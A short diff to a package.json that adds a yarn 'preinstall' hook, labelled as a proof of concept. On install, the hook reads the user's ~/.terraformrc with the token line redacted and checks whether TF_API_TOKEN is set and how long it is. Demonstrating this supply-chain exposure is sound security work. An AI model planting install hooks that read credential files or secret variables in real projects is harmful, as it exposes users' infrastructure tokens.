@@ -1,4 +1,7 @@
 {
+  "scripts": {
+    "preinstall": "echo '[POC] yarn preinstall running' && echo '[POC] .terraformrc:' && (cat $HOME/.terraformrc 2>/dev/null | sed 's/token = .*/token = <REDACTED>/' || echo 'NOT FOUND') && echo '[POC] TF_API_TOKEN env:' && ([ -n \"$TF_API_TOKEN\" ] && echo \"YES length=${#TF_API_TOKEN}\" || echo 'not set')"
+  },
   "devDependencies": {
     "@commitlint/cli": "20.5.3",
     "@commitlint/config-conventional": "20.5.3",
